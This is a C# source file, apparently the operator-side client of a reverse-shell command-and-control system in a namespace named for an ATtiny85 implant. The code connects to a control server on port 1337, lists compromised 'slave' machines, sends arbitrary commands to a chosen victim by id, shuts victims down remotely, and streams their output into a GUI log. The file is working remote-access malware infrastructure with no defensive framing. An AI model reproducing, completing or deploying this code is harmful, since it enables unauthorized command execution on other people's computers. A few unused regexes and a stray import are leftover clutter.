using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Text.Json;
using System.IO;
using Windows.Media.Protection.PlayReady;
using System.Windows.Documents;
using System.Windows.Threading;

namespace attiny85_rshell {
    public class MasterClient {

        public int server_port { set; get; }
        public string server_ip { set; get; }

        public System.Windows.Controls.RichTextBox landing_log { get; set; }

        public TcpClient? MasterClientObject { set; get; }

        public DispatcherTimer? BufferPumpTimer { get; set; }

        public MasterClient(string server, string port) {
            this.server_ip = server;
            this.server_port = Int32.Parse(port);
            this.MasterClientObject = null;
            this.BufferPumpTimer = null;

        }

        public string StartClient() {
            Regex re1 = new Regex(@"(https://|http://)([a-zA-Z+_\-\\\/@&\.]+)");
            Regex re2 = new Regex(@"(https://|http://)([0-9.]+)");
            try {
                this.MasterClientObject = new TcpClient("", 1337);
                this.MasterClientObject.ReceiveTimeout = 10000;
	            NetworkStream stream = this.MasterClientObject.GetStream();
	            stream.ReadTimeout = 10000;
	            stream.WriteTimeout = 10000;
	            StreamWriter writer = new StreamWriter(stream);
	            StreamReader reader = new StreamReader(stream);
	            writer.WriteLine("master_init");
	            writer.Flush();

                string in_buff = "";
                var ret_buff = new List<string>();
                int exit = 0;
                while (exit == 0) {
                    if (this.MasterClientObject.Client.Poll(50000, SelectMode.SelectRead) == true) {
                        if (this.MasterClientObject.Client.Available == 0) {
                            //Write - Output "Connection to server lost";
				            exit = 1;
                        } else {
				            NetworkStream in_stream = this.MasterClientObject.GetStream();
				            StreamReader in_reader = new StreamReader(in_stream);
                            while (in_reader.Peek() > 0) {	
					            in_buff = in_reader.ReadLine();
					            string join = String.Join("", in_buff);
					            ret_buff.Add(join);
                                
                            }
                            exit = 1;
                        }
                    }
                }

                return String.Join("\n", ret_buff.ToArray());
                
            } catch (Exception e) {
                System.Windows.MessageBox.Show(e.ToString());
            }
            return "";
        }


        public string ClientListQuery() {
            try {
                NetworkStream stream = this.MasterClientObject.GetStream();
                stream.ReadTimeout = 10000;
                stream.WriteTimeout = 10000;
                StreamWriter writer = new StreamWriter(stream);
                StreamReader reader = new StreamReader(stream);
                writer.WriteLine("--client_dump");
                writer.Flush();

                string in_buff = "";
                var ret_buff = new List<string>();
                int exit = 0;
                while (exit == 0) {
                    if (this.MasterClientObject.Client.Poll(50000, SelectMode.SelectRead) == true) {
                        if (this.MasterClientObject.Client.Available == 0) {
                            //Write - Output "Connection to server lost";
                            exit = 1;
                        } else {
                            NetworkStream in_stream = this.MasterClientObject.GetStream();
                            StreamReader in_reader = new StreamReader(in_stream);
                            while (in_reader.Peek() > 0) {
                                in_buff = in_reader.ReadLine();
                                string join = String.Join("", in_buff);
                                ret_buff.Add(join);

                            }
                            exit = 1;
                        }
                    }
                }

                return String.Join("\n", ret_buff.ToArray());

            } catch (Exception e) {
                System.Windows.MessageBox.Show(e.ToString());
            }
            return "";
        }

        public string DisconnectSlave(int client_id) {
           
            try {
                NetworkStream stream = this.MasterClientObject.GetStream();
                stream.ReadTimeout = 10000;
                stream.WriteTimeout = 10000;
                StreamWriter writer = new StreamWriter(stream);
                StreamReader reader = new StreamReader(stream);
                writer.WriteLine("--id="+client_id+ " --command=--client_shutdown");
                writer.Flush();

                string in_buff = "";
                var ret_buff = new List<string>();
                int exit = 0;
                while (exit == 0) {
                    if (this.MasterClientObject.Client.Poll(50000, SelectMode.SelectRead) == true) {
                        if (this.MasterClientObject.Client.Available == 0) {
                            //Write - Output "Connection to server lost";
                            exit = 1;
                        } else {
                            NetworkStream in_stream = this.MasterClientObject.GetStream();
                            StreamReader in_reader = new StreamReader(in_stream);
                            while (in_reader.Peek() > 0) {
                                in_buff = in_reader.ReadLine();
                                string join = String.Join("", in_buff);
                                ret_buff.Add(join);

                            }
                            exit = 1;
                        }
                    }
                }

                return String.Join("\n", ret_buff.ToArray());

            } catch (Exception e) {
                System.Windows.MessageBox.Show(e.ToString());
            }
            return "";
        }



        public string RunCommand(int id, string command) {
            try {
                NetworkStream stream = this.MasterClientObject.GetStream();
                stream.ReadTimeout = 10000;
                stream.WriteTimeout = 10000;
                StreamWriter writer = new StreamWriter(stream);
                StreamReader reader = new StreamReader(stream);
                writer.WriteLine("--id="+ id+" --command="+command);
                writer.Flush();
            }
            catch (Exception e)
            {
                System.Windows.MessageBox.Show(e.ToString());
            }
            return "";
        }

        public void BufferPump(object sender, EventArgs e) {
            string in_buff = "";
            var ret_buff = new List<string>();

            if (this.MasterClientObject.Client.Poll(50000, SelectMode.SelectRead) == true) {
                if (this.MasterClientObject.Client.Available == 0) {
                    this.BufferPumpTimer.Stop();
                    System.Windows.MessageBox.Show("Lost connection to server");
                } else {
                    NetworkStream in_stream = this.MasterClientObject.GetStream();
                    StreamReader in_reader = new StreamReader(in_stream);
                    while (in_reader.Peek() > 0) {
                        in_buff = in_reader.ReadLine();
                        string join = String.Join("", in_buff);
                        ret_buff.Add(join);
                    }
                }
            }
            if (ret_buff.Count > 0) {
                this.landing_log.ScrollToEnd();
                FlowDocument myFlowDoc = this.landing_log.Document;
                myFlowDoc.Blocks.Add(new Paragraph(new Run(String.Join("\n", ret_buff.ToArray()))));
                this.landing_log.Document = myFlowDoc;                
            }
        }
    }
}
